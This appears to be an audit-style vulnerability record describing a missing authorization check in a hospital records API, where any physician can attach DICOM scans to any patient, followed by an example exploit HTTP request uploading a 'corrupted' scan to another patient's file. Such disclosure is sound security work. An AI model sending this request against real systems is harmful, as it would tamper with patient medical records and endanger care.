diagnosis: The endpoint accepts DICOM medical imaging scans and attaches them to patientId from route parameters. While verifyDoctorJwt checks that the caller is a physician, it does not check if patientId is an active patient under this physician's assigned clinic. Any doctor can attach arbitrary imaging files to patient records across the hospital network.
exploit_request:
POST /clinic/patients/pat_cardio_9901/scans HTTP/1.1
Host: emr.hospitalnetwork.org
Authorization: Bearer <physician_jwt>
Content-Type: multipart/form-data; boundary=----FormBoundaryABC

------FormBoundaryABC
Content-Disposition: form-data; name="scans"; filename="corrupted_chest_scan.dcm"
Content-Type: application/dicom

<binary_dicom_content>
------FormBoundaryABC--
